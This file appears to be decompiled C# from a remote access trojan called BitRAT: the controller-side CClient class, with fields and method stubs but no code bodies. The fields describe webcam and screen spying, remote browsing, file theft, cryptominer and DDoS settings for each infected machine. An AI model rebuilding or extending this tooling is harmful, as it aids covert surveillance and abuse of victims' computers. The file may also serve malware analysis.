﻿namespace BitRAT
{
    using NAudio.Wave;
    using System;
    using System.Drawing;
    using System.IO;
    using System.Net.Sockets;
    using System.Runtime.CompilerServices;
    using System.Text;

    public class CClient
    {
        public string sKey;
        public bool IsClient;
        public string sIP;
        public string sPort;
        public string sCountry;
        public string sOperatingSystem;
        public string sWindowTitle;
        public string sUser;
        public string sSystem;
        public string sIdle;
        public string sIdleMs;
        public string sWebcam;
        public string sInOut;
        public string sSpeed;
        public string sLANIP;
        public long lSpeedBytesIn;
        public long lSpeedBytesOut;
        public string sBandwidthDL;
        public string sCam;
        public string sPing;
        public long lPing;
        public string sPID;
        public string sCPUusage;
        public string sRAM;
        public string sUACLevel;
        public long lCPUusage;
        public string sSettingPassword;
        public long lLastPacketTimeStamp;
        public long lLastSignal;
        public bool bPowerOffAllowed;
        public fDashboard fDB;
        public fPreview fPr;
        public fMain ff;
        public fSearch fSrch;
        public StringBuilder sPacket;
        public MemoryStream mPacket;
        public long lLastWebcam;
        public long lFPSWebcam;
        public double dFPSAvgSizeWebcam;
        public long lLastScreenFrame;
        public long lFPS;
        public double dFPSAvgSize;
        public long lLastRemoteBrowserFrame;
        public long lRemoteBrowserFPS;
        public double dRemoteBrowserFPSAvgSize;
        public long lLastPreviewScreenFrame;
        public long lLastPreviewWebcamFrame;
        public long lLastSpeedUpdate;
        public long lPreviewScreenFPS;
        public long lPreviewWebcamFPS;
        public double dPreviewScreenFPSAvgSize;
        public double dPreviewWebcamFPSAvgSize;
        public bool pending_dc;
        public bool pending_dc_timeout;
        public double stats_bytes_in;
        public double stats_last_bytes_in;
        public double stats_bytes_out;
        public double stats_last_bytes_out;
        public bool bJustConnected;
        public bool bIsAuthenticated;
        private Image img_flag;
        private Image img_con;
        private Image img_tmb;
        private Image img_type;
        private Image img_status;
        public GClass1 sock_async;
        public NetworkStream mS;
        internal readonly string mSocketCounter;
        private readonly string mIndex;
        public bool IS_SSL;
        public bool SCREEN_IS_STREAMING;
        public bool WEBCAM_IS_STREAMING;
        public bool REMOTE_BROWSER_IS_STREAMING;
        public bool FILE_TRANSFER_ISPAUSED;
        public bool FILE_TRANSFER_ACTIVE;
        public string FILE_TRANSFER_ID;
        public string FILE_TRANSFER_USER_KEY;
        public string FILE_TRANSFER_USER;
        public string FILE_TRANSFER_FILENAME;
        public string FILE_TRANSFER_FILESIZE;
        public string FILE_TRANSFER_FILE_LAST_MODIFIED;
        public string FILE_TRANSFER_GROUP_ID;
        public string FILE_TRANSFER_REMOTE_FILE;
        public string FILE_TRANSFER_LOCAL_FILE;
        public long FILE_TRANSFER_POS;
        public double FILE_TRANSFER_SPEED_COUNTER;
        public double FILE_TRANSFER_SPEED_AVG;
        public double FILE_TRANSFER_ELAPSED;
        public long FILE_TRANSFER_PACKETS;
        public double FILE_TRANSFER_STARTED;
        public double FILE_TRANSFER_PAUSED_TIMESTAMP;
        public long FILE_TRANSFER_LAST_PACKET;
        public MemoryStream FILE_TRANSFER_DL_DATA;
        public bool FILE_TRANSFER_COMPLETED;
        public bool FILE_TRANSFER_IS_RESUME;
        public long FILE_TRANSFER_COUNT_UL;
        public long FILE_TRANSFER_COUNT_DL;
        public string FLAG;
        public string SCREENLIVE_SOCKET_ID;
        public string SCREENLIVE_USER_KEY;
        public bool SCREENLIVE_ACTIVE;
        public int SCREENLIVE_FRAME_COUNT;
        public string SCREENLIVE_SECONDARY_SOCKET_ID;
        public string SCREENLIVE_SECONDARY_USER_KEY;
        public bool SCREENLIVE_SECONDARY_ACTIVE;
        public string SCREEN_PREVIEW_SOCKET_ID;
        public string SCREEN_PREVIEW_USER_KEY;
        public bool SCREEN_PREVIEW_ACTIVE;
        public string WEBCAMSTREAM_SOCKET_ID;
        public string WEBCAMSTREAM_USER_KEY;
        public bool WEBCAMSTREAM_ACTIVE;
        public string WEBCAM_PREVIEW_SOCKET_ID;
        public string WEBCAM_PREVIEW_USER_KEY;
        public bool WEBCAM_PREVIEW_ACTIVE;
        public string REMOTE_BROWSER_SOCKET_ID;
        public string REMOTE_BROWSER_USER_KEY;
        public bool REMOTE_BROWSER_ACTIVE;
        public string SOCKET_COMMAND_USER_KEY;
        public bool SOCKET_COMMAND_ACTIVE;
        public string SSL_CIPHER;
        public string SSL_HASH;
        public string SSL_KEYEXCHANGE;
        public string SSL_PROTOCOL;
        public string SSL_CIPHERSUITE;
        public bool PREVIEW_SCREEN_IS_ENABLED;
        public bool PREVIEW_WEBCAM_IS_ENABLED;
        public string MINER_LAST_SETTINGS;
        public string DDOS_LAST_SETTINGS;
        private readonly long lSockTimeout;
        [AccessedThroughProperty("WavePlaybackStopped"), CompilerGenerated]
        private AsioOut _WavePlaybackStopped;

        public CClient(ref fMain ff, string sSocketID, GClass1 sck_async, bool SSL);
        public void AUDIO_PLAYBACK(byte[] bData);
        internal void REMOTE_BROWSER_FPS_UPDATE(double dSize);
        internal void SCREEN_FPS_UPDATE(double dSize);
        public void SOCKET_DISCONNECT(ref bool bCleanUp);
        public override string ToString();
        internal void WEBCAM_FPS_UPDATE(ref double dSize);
        private void WPlaybackStopped(object sender, EventArgs e);

        [field: AccessedThroughProperty("WavePlaybackStopped")]
        private AsioOut WavePlaybackStopped { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

        public Image ICO_FLAG { get; set; }

        public Image ICO_TYPE { get; set; }

        public Image ICO_STATUS { get; set; }

        public Image ICO_CON { get; set; }

        public Image ICO_TMB { get; set; }

        public string IP { get; set; }

        public string LANIP { get; set; }

        public string SYS_SHORT { get; set; }

        public string USER { get; set; }

        public string SETTINGPASSWORD { get; set; }

        public string OS { get; set; }

        public string AV { get; set; }

        public string IDLE { get; set; }

        public string INOUT { get; set; }

        public string SPEED { get; set; }

        public string BANDWIDTHDL { get; set; }

        public string CAM { get; set; }

        public string COUNTRY { get; set; }

        public string PING { get; set; }

        public string CPU_USAGE { get; set; }

        public string RAM { get; set; }

        public string UACLEVEL { get; set; }

        internal sealed class Class151
        {
            public byte[] byte_0;
            public CClient.Class152 class152_0;

            internal void _Lambda$__15();
        }

        internal sealed class Class152
        {
            public string[] string_0;
            public CClient cclient_0;

            internal void _Lambda$__0();
            internal void _Lambda$__1();
            internal void _Lambda$__10();
            internal void _Lambda$__11();
            internal void _Lambda$__12();
            internal void _Lambda$__13();
            internal void _Lambda$__14();
            internal void _Lambda$__16();
            internal void _Lambda$__17();
            internal void _Lambda$__18();
            internal void _Lambda$__19();
            internal void _Lambda$__2();
            internal void _Lambda$__3();
            internal void _Lambda$__4();
            internal void _Lambda$__5();
            internal void _Lambda$__6();
            internal void _Lambda$__7();
            internal void _Lambda$__8();
            internal void _Lambda$__9();
        }

        internal sealed class Class153
        {
            public char char_0;

            internal bool _Lambda$__0(char char_1);
        }

        private delegate void Delegate201(double double_0);

        private delegate void Delegate202(byte[] byte_0);

        private delegate void Delegate203(ref double double_0);

        private delegate void Delegate204(double double_0);
    }
}

